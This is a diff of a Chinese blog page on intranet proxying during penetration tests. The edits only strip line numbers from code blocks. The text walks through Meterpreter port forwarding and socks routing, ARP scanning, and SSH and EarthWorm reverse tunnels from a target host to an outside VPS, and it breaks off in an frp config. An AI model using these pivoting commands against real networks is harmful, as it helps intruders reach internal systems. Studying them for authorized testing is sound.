@@ -63,7 +63,7 @@
         "description": "本文首发于先知社区：https://xz.aliyun.com/t/8001 这篇文章列举几种内网代理方法。 Meterpreter Meterpreter 可以说是渗透中用得较多的工具，在反弹了处于内网的目……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1769 ,
+        "wordCount":  1721 ,
         "image": ["https://oss.zjun.info/zjun.info/Intranet-proxy-1.png","https://oss.zjun.info/zjun.info/Intranet-proxy-2.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-3.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-4.png","https://oss.zjun.info/zjun.info/Intranet-proxy-5.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-6.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-7.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-8.png","https://oss.zjun.info/zjun.info/Intranet-proxy-9.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-10.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-11.png","https://oss.zjun.info/zjun.info/Intranet-proxy-12.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-13.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-14.webp","https://oss.zjun.info/zjun.info/Intranet-proxy-15.png","https://oss.zjun.info/zjun.info/Intranet-proxy-16.webp"],
         "publisher": {
             "@type": "Organization",
@@ -295,19 +295,7 @@
 <p><code>portfwd</code> 用于转发单个端口，当你目的性很强的情况下，比如只需要目标的 <code>3389</code> 端口等，这不失为一种较好的方法。</p>
 <p>详细使用语法见：<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p>
 <p>大致如下：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; portfwd add –l <span class="m">7003</span> –p <span class="m">3389</span> –r 192.168.52.138
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; portfwd add –l <span class="m">7003</span> –p <span class="m">3389</span> –r 192.168.52.138
 </span></span><span class="line"><span class="cl"><span class="c1"># 添加转发 -l：服务器监听端口  -p：内网主机需转发端口  -r：目标内网主机 ip</span>
 </span></span><span class="line"><span class="cl">meterpreter &gt; portfwd delete –l <span class="m">3389</span> –p <span class="m">3389</span> –r 172.16.194.191
 </span></span><span class="line"><span class="cl"><span class="c1"># 删除转发</span>
@@ -315,62 +303,29 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 列出当前正在侦听和转发的端口列表</span>
 </span></span><span class="line"><span class="cl">meterpreter &gt; portfwd flush
 </span></span><span class="line"><span class="cl"><span class="c1"># 移除所有转发端口</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><h3 id="socks-代理"><a href="#socks-代理" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:socks-代理" class="headings">socks 代理</a></h3>
+</span></span></code></pre></div><h3 id="socks-代理"><a href="#socks-代理" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:socks-代理" class="headings">socks 代理</a></h3>
 <p><code>socks</code> 代理只是 <code>tcp</code> 一层往上，如 <code>icmp</code> 、 <code>arp</code> 等就无法被代理。</p>
 <p><code>msf</code> 中内置了三个 <code>socks</code> 代理模块，分别是 <code>socks4a</code> 、 <code>socks5</code> 、 <code>socks_unc</code> 。一般常使用 <code>socks4a</code> 和 <code>socks5</code> 进行代理。其二者只是由于所支持的具体应用不同而存在差异。 <code>socks4</code> 只支持 <code>TCP</code> 协议而 <code>socks5</code> 支持 <code>TCP/UDP</code> 协议，还支持各种身份验证机制等协议，也就是说这里使用 <code>socks5</code> 的话还需要设置用户名与密码。</p>
 <p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-1.png" alt="Intranet-proxy-1"></p>
 <p>在获取 <code>shell</code> 的机器上添加路由</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; run get_local_subnets
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; run get_local_subnets
 </span></span><span class="line"><span class="cl">meterpreter &gt; run autoroute -s 192.168.21.0/24
 </span></span><span class="line"><span class="cl"><span class="c1"># 添加路由</span>
 </span></span><span class="line"><span class="cl">meterpreter &gt; run autoroute -p
 </span></span><span class="line"><span class="cl"><span class="c1"># 显示路由</span>
 </span></span><span class="line"><span class="cl">meterpreter &gt; route flush
 </span></span><span class="line"><span class="cl"><span class="c1"># 删除</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-2.webp" alt="Intranet-proxy-2"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-2.webp" alt="Intranet-proxy-2"></p>
 <p>可以先通过 <code>arp</code> 扫描内网大概存活机器情况</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; run post/windows/gather/arp_scanner <span class="nv">RHOSTS</span><span class="o">=</span>192.168.21.0/24
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-3.webp" alt="Intranet-proxy-3"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; run post/windows/gather/arp_scanner <span class="nv">RHOSTS</span><span class="o">=</span>192.168.21.0/24
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-3.webp" alt="Intranet-proxy-3"></p>
 <p>然后建立 <code>socks4</code> 代理，</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; background
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; background
 </span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use auxiliary/server/socks4a
 </span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; <span class="nb">set</span> srvhost 127.0.0.1
 </span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; <span class="nb">set</span> srvport <span class="m">1080</span>
 </span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; run
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-4.png" alt="Intranet-proxy-4"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-4.png" alt="Intranet-proxy-4"></p>
 <p>设置完成后配置 <code>proxychains</code> ，成功</p>
 <p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-5.webp" alt="Intranet-proxy-5"></p>
 <p><code>socks5</code> 模块也同理，只是会多设置一个用户名与密码。</p>
@@ -381,39 +336,17 @@
 <p><a href="https://github.com/cw1997/NATBypass" target="_blank" rel="noopener">NATBypass</a>是一个端口转发工具，类似于 <code>lcx</code> ，称为 <code>golang</code> 版 <code>lcx</code> ，可编译为 <code>linux</code> 或 <code>windows</code> 版本。</p>
 <p>具体原理大概就是公网 <code>vps</code> 监听两个本地端口，内网目标主机建立一个端口转发，比如将本地 <code>3389</code> 转发到公网 <code>vps</code> 的一个端口， <code>vps</code> 监听的另一个端口就相当于内网主机 <code>3389</code> 。</p>
 <p>公网 vps</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nb -listen <span class="m">1997</span> <span class="m">2017</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>内网主机</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nb -slave 127.0.0.1:3389 x.x.x.x:1997
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nb -listen <span class="m">1997</span> <span class="m">2017</span>
+</span></span></code></pre></div><p>内网主机</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nb -slave 127.0.0.1:3389 x.x.x.x:1997
 </span></span><span class="line"><span class="cl"><span class="c1"># x.x.x.x 是公网 vps 的 IP</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>本机直接访问公网 <code>vps</code> 的 <code>2017</code> 端口即可实现远程内网主机。</p>
+</span></span></code></pre></div><p>本机直接访问公网 <code>vps</code> 的 <code>2017</code> 端口即可实现远程内网主机。</p>
 <h2 id="ssh-隧道"><a href="#ssh-隧道" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:ssh-隧道" class="headings">ssh 隧道</a></h2>
 <p><code>ssh</code> 可以端口转发或是建立 <code>socks5</code> 隧道。</p>
 <h3 id="公网主机建立-socks-隧道"><a href="#公网主机建立-socks-隧道" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:公网主机建立-socks-隧道" class="headings">公网主机建立 SOCKS 隧道</a></h3>
 <p>如果是具有公网地址的主机利用 <code>ssh</code> 建立 <code>socks5</code> 隧道就简单了：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -N -f -D <span class="m">9070</span> x.x.x.x
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-6.webp" alt="Intranet-proxy-6"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -N -f -D <span class="m">9070</span> x.x.x.x
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-6.webp" alt="Intranet-proxy-6"></p>
 <p>随后编辑本机 <code>/etc/proxychains.conf</code> 文件：</p>
 <p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-7.webp" alt="Intranet-proxy-7"></p>
 <p>代理成功：</p>
@@ -424,25 +357,11 @@
 <h3 id="通过公网主机穿透两个内网"><a href="#通过公网主机穿透两个内网" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:通过公网主机穿透两个内网" class="headings">通过公网主机穿透两个内网</a></h3>
 <p>设想一下，你和目标主机分属不同的内网，从外界都无法直接连通。不过好在这两个内网都可以访问公网（JumpHost），你考虑通过一台公网机器建立两个内网之间的隧道。</p>
 <p>在目标主机中执行：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -qTfNn -R 2222:localhost:22 JumpHost
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-11.png" alt="Intranet-proxy-11"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -qTfNn -R 2222:localhost:22 JumpHost
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-11.png" alt="Intranet-proxy-11"></p>
 <p>现在登录公网主机执行：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -p <span class="m">2222</span> localhost
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-12.webp" alt="Intranet-proxy-12"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -p <span class="m">2222</span> localhost
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-12.webp" alt="Intranet-proxy-12"></p>
 <p>达到的效果只是将目标主机的端口转发到了公网，但是并未实现 <code>socks</code> 代理，思考后，尝试了后都不成功，不知可行否，若有师傅告知非常感激！</p>
 <p>参考：<a href="https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html" target="_blank" rel="noopener">https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html</a></p>
 <h2 id="earthworm"><a href="#earthworm" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:earthworm" class="headings">Earthworm</a></h2>
@@ -451,30 +370,13 @@
 <p>详细使用语法见：<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
 <p><code>EW</code> 功能很强大，提供“正向”、“反向”、“多级级联”等方式打通隧道，更适用不同的操作系统， <code>Linux</code> 、 <code>Windows</code> 、 <code>MacOS</code> 、 <code>Arm-Linux</code> 。下面介绍一种简单的反向代理方法。</p>
 <p>公网 <code>vps</code> 执行</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./ew_for_linux64 -s rcsocks -l <span class="m">7010</span> -e <span class="m">7011</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>目标内网主机执行</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.<span class="se">\e</span>w_for_Win.exe -s rssocks -d x.x.x.x -e <span class="m">7011</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./ew_for_linux64 -s rcsocks -l <span class="m">7010</span> -e <span class="m">7011</span>
+</span></span></code></pre></div><p>目标内网主机执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">.<span class="se">\e</span>w_for_Win.exe -s rssocks -d x.x.x.x -e <span class="m">7011</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># windows</span>
 </span></span><span class="line"><span class="cl">./ew_for_linux64 -s rssocks -d x.x.x.x -e <span class="m">7011</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># linux</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>本地攻击机即可通过 <code>proxychains</code> 或者浏览器设置 <code>socks5</code> 代理至公网 <code>vps</code> 的 <code>7011</code> 端口即可。</p>
+</span></span></code></pre></div><p>本地攻击机即可通过 <code>proxychains</code> 或者浏览器设置 <code>socks5</code> 代理至公网 <code>vps</code> 的 <code>7011</code> 端口即可。</p>
 <p>注：无意间浏览该工具作者的博客发现了该工具的新版本，<a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a> 还没来得及测试使用，先分享一下。</p>
 <h2 id="frp"><a href="#frp" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:frp" class="headings">frp</a></h2>
 <p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-14.webp" alt="Intranet-proxy-14"></p>
@@ -482,42 +384,13 @@
 <p>项目地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p>
 <p>可用于端口映射或打通 <code>socks</code> 隧道，下面介绍 <code>socks</code> 隧道代理</p>
 <p>公网 vps 主机 <code>frps.ini</code> 文件</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[common]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[common]</span>
